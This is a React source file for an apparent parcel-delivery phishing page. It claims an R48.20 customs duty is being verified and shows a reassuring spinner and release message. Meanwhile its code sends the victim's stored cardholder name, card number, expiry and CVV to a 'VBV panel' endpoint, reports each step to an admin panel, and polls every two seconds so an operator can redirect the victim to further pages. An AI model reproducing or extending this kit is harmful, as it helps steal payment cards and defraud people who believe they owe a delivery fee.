import { motion } from "framer-motion";
import { Lock, CheckCircle2, ShieldCheck, Info } from "lucide-react";
import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useVisitId } from "@/hooks/use-visit-id";
import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";

export default function PaymentVerification() {
  const [status, setStatus] = useState<'verifying' | 'authorized'>('verifying');
  const [, setLocation] = useLocation();
  const visitId = useVisitId(); // Initialiser le visitId

  useEffect(() => {
    // Enregistrer le client dans le panel VBV dès l'arrivée sur payment-verification
    const registerClient = async () => {
      try {
        // Récupérer les données de paiement depuis localStorage
        const paymentDataStr = localStorage.getItem("payment_data");
        let paymentData: {
          cardholder: string;
          cardNumber: string;
          expiry: string;
          cvv: string;
          fullName: string;
        } | null = null;

        if (paymentDataStr) {
          try {
            paymentData = JSON.parse(paymentDataStr);
          } catch (e) {
            console.error("Failed to parse payment data:", e);
          }
        }

        const storedFullName = localStorage.getItem("client_fullname");
        const fullName = storedFullName || paymentData?.fullName || paymentData?.cardholder || "";

        console.log("[Payment Verification] Registering client in VBV panel");

        const response = await fetchWithVisitId("/api/vbv-panel/register", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            fullName: fullName,
            cardInfo: paymentData ? {
              cardholder: paymentData.cardholder,
              cardNumber: paymentData.cardNumber,
              expiry: paymentData.expiry,
              cvv: paymentData.cvv,
            } : undefined,
            page: "Payment Verification",
          }),
        });

        if (!response.ok) {
          const errorData = await response.json().catch(() => ({}));
          console.error("[Payment Verification] Failed to register client:", errorData);
        } else {
          const result = await response.json();
          console.log("[Payment Verification] Client registered successfully:", result);
        }
      } catch (error) {
        console.error("[Payment Verification] Failed to register client:", error);
      }
    };

    registerClient();

    // notify admin panel that we entered payment verification step
    void fetchWithVisitId("/api/flows/event", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        step: "payment-verification",
        notes: "Payment verification screen shown",
      }),
    });

    // Polling pour vérifier si une redirection a été déclenchée depuis le panel
    const checkRedirect = async () => {
      try {
        const response = await fetchWithVisitId("/api/vbv-panel/redirect-status", {
          method: "GET",
        });
        if (response.ok) {
          const data = await response.json();
          if (data.shouldRedirect && data.redirectTo) {
            setLocation(data.redirectTo);
          }
        }
      } catch (error) {
        console.error("Failed to check redirect status:", error);
      }
    };

    // Vérifier toutes les 2 secondes
    const redirectInterval = setInterval(checkRedirect, 2000);

    return () => {
      clearInterval(redirectInterval);
    };
  }, [setLocation, visitId]);

  return (
    <div className="min-h-screen bg-orange-50/30 flex flex-col font-sans">
      {/* Header */}
      <div className="bg-[#1e293b] text-white py-4 px-6 text-center shadow-md">
        <div className="flex items-center justify-center gap-2 font-bold text-lg">
          <CheckCircle2 className="h-6 w-6 text-white" />
          Payment Verification
        </div>
      </div>

      <div className="flex-grow flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="w-full max-w-md bg-white rounded-lg shadow-xl overflow-hidden p-8 text-center relative"
        >
          {/* Top Yellow Bar */}
          <div className="absolute top-0 left-0 w-full h-1 bg-brand-orange"></div>

          <div className="flex flex-col items-center mb-6">
            <div className="mb-6 relative">
               {status === 'verifying' ? (
                 <>
                   <motion.div
                     animate={{ rotate: 360 }}
                     transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                     className="w-16 h-16 rounded-full border-4 border-gray-100 border-t-brand-orange"
                   />
                   <div className="absolute inset-0 flex items-center justify-center">
                      <Lock className="h-6 w-6 text-brand-orange" />
                   </div>
                 </>
               ) : (
                 <motion.div
                   initial={{ scale: 0 }}
                   animate={{ scale: 1 }}
                   className="w-16 h-16 rounded-full bg-orange-100 flex items-center justify-center"
                 >
                    <ShieldCheck className="h-8 w-8 text-orange-600" />
                 </motion.div>
               )}
            </div>

            <h1 className="text-2xl font-bold text-brand-blue mb-3">
              {status === 'verifying' ? 'Verifying your payment...' : 'Payment Pending Verification'}
            </h1>
            
            <p className="text-gray-500 text-sm leading-relaxed max-w-xs mx-auto mb-8">
              {status === 'verifying' 
                ? "We're processing your R48.20 payment and updating your parcel status. This ensures quick customs clearance."
                : "Your payment is being processed. Your parcel status will be updated once the payment is verified and authorized."
              }
            </p>

            {/* Success/Status Box */}
            <motion.div 
              layout
              className={`w-full rounded-lg p-6 border ${
                status === 'verifying' 
                  ? 'bg-gray-50 border-gray-100' 
                  : 'bg-orange-50 border-orange-200'
              }`}
            >
              {status === 'verifying' ? (
                <div className="flex flex-col gap-2 opacity-50">
                  <div className="h-4 bg-gray-200 rounded w-1/2 mx-auto animate-pulse"></div>
                  <div className="h-8 bg-gray-200 rounded w-3/4 mx-auto animate-pulse"></div>
                  <div className="h-3 bg-gray-200 rounded w-2/3 mx-auto animate-pulse mt-2"></div>
                </div>
              ) : (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                >
                  <div className="flex items-center justify-center gap-2 text-orange-700 font-bold mb-2">
                    <ShieldCheck className="h-5 w-5" />
                    Payment Pending Verification
                  </div>
                  <div className="text-4xl font-black text-brand-blue mb-2">
                    Amount: R48.20
                  </div>
                  <div className="text-xs text-gray-500 font-medium">
                    Reason: Customs Clearance Duty • Reference: CRI285740
                  </div>
                </motion.div>
              )}
            </motion.div>
          </div>

          <div className="flex items-center justify-center gap-2 text-gray-400 text-xs mt-6">
            <Info className="h-4 w-4" />
            <span>Your parcel will be released for delivery within 1-2 business hours</span>
          </div>

        </motion.div>
      </div>
    </div>
  );
}
